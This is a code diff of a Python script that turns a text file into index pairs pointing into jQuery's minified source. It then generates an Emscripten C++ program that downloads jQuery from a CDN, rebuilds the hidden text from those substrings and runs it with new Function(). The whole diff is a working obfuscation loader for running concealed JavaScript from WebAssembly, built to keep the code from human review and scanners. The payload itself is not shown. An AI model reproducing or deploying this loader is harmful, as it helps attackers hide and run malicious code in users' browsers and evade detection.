@@ -2,7 +2,7 @@ import os
 from urllib.request import urlopen
 
 
-def preprocessing(message_path, cipher_path):
+def preprocessing(message_path):
     with open(message_path, 'rb') as f:
         message = f.read()
 
@@ -19,30 +19,74 @@ def preprocessing(message_path, cipher_path):
             current_find = message[already_found:]
         else:
             current_find = current_find[:-1]
-    
+
     if already_found != len(message):
         raise Exception("Couldn't find all chars")
 
-    code = "int lenght = %s;\n" % str(len(tabel_idxs)) + \
-           "int *idxs_table = new int[2*%s];\n" % str(len(tabel_idxs)) + \
-           "".join("idxs_table[%s] = %s;\tidxs_table[%s + %s] = %s;\n"
-                   % (str(i), str(idx[0]), str(len(tabel_idxs)), str(i), str(idx[1]))
-                   for i, idx in enumerate(tabel_idxs)) + \
-           "delete [] idxs_table;\n"
+    lines = ["idxs_table[%s] = %s;\tidxs_table[%s + %s] = %s;"
+             % (str(i), str(idx[0]), str(len(tabel_idxs)), str(i), str(idx[1]))
+             for i, idx in enumerate(tabel_idxs)]
 
-    with open(cipher_path, 'w') as f:
-        f.write(code)
+    return lines
+
+
+def generate_main(lines):
+    return """#include <emscripten.h>
+#include <string>
+#include <iostream>
+#include <sstream>
+
+using namespace std;
+
+EM_JS(void, run_code, (const char* str), {
+     new Function(UTF8ToString(str))();
+});
+
+EM_JS(char *, get_jquery, (), {
+    var request = new XMLHttpRequest();
+    request.open('GET', 'https://code.jquery.com/jquery-3.4.1.min.js', false);  // `false` makes the request synchronous
+    request.send(null);
+
+    if (request.status === 200) {
+        var text = request.responseText;
+        var lengthBytes = lengthBytesUTF8(text) + 1;
+        var stringOnWasmHeap = _malloc(lengthBytes);
+        stringToUTF8(text, stringOnWasmHeap, lengthBytes);
+        return stringOnWasmHeap;
+    } else {
+        return null;
+    }
+});
+
+
+int main() {
+    int len = %d;
+    int *idxs_table = new int[2*len];
+    
+    %s
+    
+    char* tmp = get_jquery();
+    if (!tmp) return 1;
+    string data(tmp);
+
+    ostringstream oss("");
+    for (int temp = 0; temp < len; temp++)
+        oss << data.substr(idxs_table[temp], idxs_table[len + temp]);
+    run_code(oss.str().c_str());
+
+    delete[] idxs_table;
+    delete[] tmp; 
+}
+""" % (len(lines), "\n\t".join(lines))
 
 
 def main():
     message_path = r"..\code\code.txt"
 
-    folder_name = os.path.dirname(message_path)
-    file_name, ext = os.path.splitext(os.path.basename(message_path))
-    cipher_path = os.path.join(folder_name, file_name + "_enc" + ext)
-    
-    preprocessing(message_path, cipher_path)
+    lines = preprocessing(message_path)
+    with open("../src/main.cpp", "w") as f:
+        f.write(generate_main(lines))
 
 
 if __name__ == "__main__":
-    main()        
+    main()
